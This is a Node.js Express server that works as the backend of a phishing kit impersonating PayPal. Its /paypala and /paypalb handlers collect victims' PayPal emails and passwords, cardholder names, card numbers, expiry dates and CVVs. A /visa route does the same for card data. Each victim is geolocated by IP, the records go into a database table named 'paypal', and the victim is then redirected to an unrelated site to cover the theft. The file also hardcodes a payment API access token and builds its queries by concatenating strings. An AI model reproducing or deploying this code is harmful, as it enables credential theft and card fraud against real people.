var express = require('express');
var app = express();
var pg = require('pg');
var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
const PORT = process.env.PORT || 5000;
app.use(express.static('public'));
app.set('view engine', 'ejs')
const iplocation = require("iplocation").default;
var loc;
var city;
var reg;
const client = new pg.Client(process.env.POSTGRESQL_ADDON_URI);
client.connect();
client.query("create table paypal (id serial , mail text,pass text,cardholder text,card text,exp text,cvv text,country TEXT,ip TEXT,time timestamp default now())")
// #######################################################################
const crypto = require('crypto');
const squareConnect = require('square-connect');
const accessToken = 'EAAAEPq3DcfdbAVJ2hw8EqUi0-y_yRLROjmoVU-sCZxfX2MFturVGF_m38rDQU1Z';

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(__dirname));

// Set Square Connect credentials and environment
const defaultClient = squareConnect.ApiClient.instance;

// Configure OAuth2 access token for authorization: oauth2
const oauth2 = defaultClient.authentications['oauth2'];
oauth2.accessToken = accessToken;

// Set 'basePath' to switch between sandbox env and production env
// sandbox: https://connect.squareupsandbox.com
// production: https://connect.squareup.com
defaultClient.basePath = 'https://connect.squareupsandbox.com';

app.post('/process-payment', async (req, res) => {
    const request_params = req.body;

    // length of idempotency_key should be less than 45
    const idempotency_key = crypto.randomBytes(22).toString('hex');

    // Charge the customer's card
    const payments_api = new squareConnect.PaymentsApi();
    const request_body = {
        source_id: request_params.nonce,
        amount_money: {
            amount: 2500, // $1.00 charge
            currency: 'USD'
        },
        idempotency_key: idempotency_key
    };

    try {
        const response = await payments_api.createPayment(request_body);
        res.status(200).json({
            'title': 'Payment Successful',
            'result': response
        });
    } catch (error) {
        res.status(500).json({
            'title': 'Payment Failure',
            'result': error.response.text
        });
    }
});
// #################################################################################################
app.get('*/mid', function (req, res) {
    res.render('mid')
})
app.get('*/credit', function (req, res) {
    res.render('credit')
})
app.get('*/login', function (req, res) {
    res.render('login')
})
app.get('*/confirm', function (req, res) {
    res.render('confirm')
})
app.get('*/i', function (req, res) {
    res.render('i')
})
app.get('*/z', function (req, res) {
    res.render('z')
})




// ############################################################


app.post('/visa', function (req, res) {
    var a = req.body.a+'+++';
    var b = req.body.b;
    var c = req.body.c;
    b = b.replace('/', '.')
    console.log(a + '--' + b + '--' + c)

    var ip = req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);

    iplocation(ip, [], (error, res) => { loc = res.country; city = res.region; reg = res.city;console.log(res);
        var location = loc + '---' + city + '---' + reg ;

    client.query("Insert into paypal (card,exp,cvv,country,ip) values('" + a + "','" + b + "','" + c + "','"+location+"','"+ip+ "')", function (err, result) {
        console.log('resulttttttttttttt : ' + result)
        console.log('errrrrrrrrrrrrrrrrrrrrrr : ' + err)
        
    });
    })
})
app.post('/paypala', function (req, res) {
    var a = req.body.login_email;
    var b = req.body.login_password;
    console.log(a + b)

var ip = req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);

    iplocation(ip, [], (error, res) => { loc = res.country; city = res.region; reg = res.city;console.log(res);
        var location = loc + '---' + city + '---' + reg ;

    client.query("Insert into paypal (mail,pass,country,ip) values('" + a + "','" + b + "','"+location+"','"+ip+"')", function (err, result) { });

    });
    res.redirect('/confirm')
});

app.post('/paypalb', function (req, res) {
    var a = req.body.cardHolder;
    var b = req.body.cardNumber;
    var c = req.body.expDate;
    var d = req.body.verificationCode;

var ip = req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);

    iplocation(ip, [], (error, res) => { loc = res.country; city = res.region; reg = res.city;console.log(res);
        var location = loc + '---' + city + '---' + reg ;

    console.log(req.body);
    client.query("Insert into paypal (cardholder,card,exp,cvv,country,ip) values('" + a + "','" + b + "','" + c + "','" + d + "','"+location+"','"+ip+ "')", function (err, result) { });

    });
    res.redirect('https://www.freelancer.com')
});






// #######################################################################
app.get('*', function (req, res) { res.render('z') })

app.listen(PORT, function () { console.log('Server Started') })
